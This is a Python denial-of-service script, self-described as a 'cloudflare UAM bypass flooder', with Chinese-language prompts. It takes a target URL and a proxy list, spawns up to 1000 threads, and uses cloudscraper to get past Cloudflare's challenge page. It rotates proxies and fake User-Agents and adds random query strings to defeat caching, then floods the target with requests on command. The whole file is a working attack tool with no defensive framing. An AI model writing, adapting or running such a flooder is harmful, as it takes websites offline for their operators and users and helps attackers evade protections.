# -*- coding: UTF-8 -*-
# cloudflare UAM bypass flooder by h2o
import os
import random
import time
import requests
import threading
import cloudscraper
from colorama import Fore
from fake_useragent import UserAgent


def random_url(url):
    items = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
             'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    temp = ""
    random_str = temp.join(random.sample(items, 10))
    if url.find('?') >= 0:
        url = url + "&" + random_str
    else:
        url = url + "?" + random_str
    return url

def opth():
	for a in range(xc):
		x = threading.Thread(target=atk)
		x.start()
		print("线程 " + str(a+1) + " 创建成功 ")
	print(Fore.RED + "正在展开线程")
	time.sleep(1)
	input(Fore.CYAN + "按下回车发动打击")
	global oo
	oo = True
oo = False

def main():
	global url
	global list
	global pprr
	global thrd
	global xc
	url = str(input(Fore.GREEN + "目标地址 : " + Fore.WHITE))
	list = str(input(Fore.GREEN + "代理列表 (proxy.txt) : " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "代理总数 : " + Fore.WHITE + "%d" %len(pprr))
	xc = int(input("线程 (1-1000 推荐代理数) : "))
	opth()


headers = {
	"User-Agent": "",
	"Referer": "http://baidu.com/",
	"Cache-Control": "no-cache",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*",
	"Accept-encoding": "gzip, deflate",
	"Connection": "Keep-Alive"
	}
random_ua = UserAgent()



def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cloudscraper.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
			while oo:
					try:
						headers["User-Agent"] = random_ua.random
						get1 = s.get(random_url(url),headers = headers,timeout=6)
						get2 = s.get(random_url(url),headers = headers,timeout=7)
						get3 = s.get(random_url(url),headers = headers,timeout=8)						
						print(Fore.CYAN + '代理 ----> ' + Fore.WHITE +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]) +Fore.CYAN+ ' ---> 穿盾打击 ---> ' + str(get3) +Fore.WHITE)
						if('403' or '512' or '503' in get3):
							raise Exception("访问异常！")
					except:
						s.close
						proxy = random.choice(pprr).strip().split(":")
						print("失败，尝试下一个代理")

if __name__ == "__main__":
	main()
